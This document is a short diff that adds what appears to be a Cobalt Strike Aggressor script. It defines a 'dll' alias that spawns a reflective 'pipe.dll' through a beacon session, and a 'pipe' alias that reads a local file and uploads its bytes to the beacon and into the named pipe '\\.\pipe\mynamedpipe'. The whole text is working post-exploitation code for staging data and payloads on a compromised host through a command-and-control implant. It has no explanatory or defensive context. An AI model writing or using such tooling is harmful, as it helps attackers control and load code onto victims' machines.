@@ -1,0 +1,13 @@
+alias dll {
+	bdllspawn($1,script_resource("pipe.dll") , $2, "", 1000, false);
+}
+alias pipe {
+	$handle = openf($2);
+	$data = readb($handle, -1);
+	closef($handle);
+	$size = strlen($data);
+	blog($1,"file size ".$size);
+	fireAlias($1, "dll", $size);
+	bupload_raw($1, "", $data);
+	bupload_raw($1, "\\\\.\\pipe\\mynamedpipe", $data);
+}
